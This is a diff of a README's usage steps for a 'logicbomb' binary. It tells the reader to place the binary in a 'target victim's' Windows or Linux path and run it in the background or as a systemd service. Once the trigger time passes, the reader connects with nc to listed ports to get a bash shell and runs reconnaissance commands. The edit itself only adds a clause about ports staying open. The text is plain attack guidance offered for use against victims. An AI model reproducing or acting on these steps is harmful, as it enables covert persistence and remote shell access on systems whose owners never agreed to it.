@@ -13,7 +13,7 @@ Usage:
 3. Place the created binary file into your desired target victim's location path of windows/Linux directory. Then execute---> './logicbomb &'. You can also bind this as a service file inside systemd manually in order to avoid using '&' while executing the file. I will post that part later. Now, wait till your preferred triggered time of epoch execution.
 In Linux,
 4. Open up another terminal and "nc -l 'target_ip' 7864/7777/7783/8348/8677/8999". This will spawn a bash shell and you are in!
-Check whoami, pwd, ls, ifconfig. Also monitor using "netstat -antlp | grep 'ncat' "
+Check whoami, pwd, ls, ifconfig. Also monitor using "netstat -antlp | grep 'ncat' " if those ports are persistently open.
 
 
 Note:
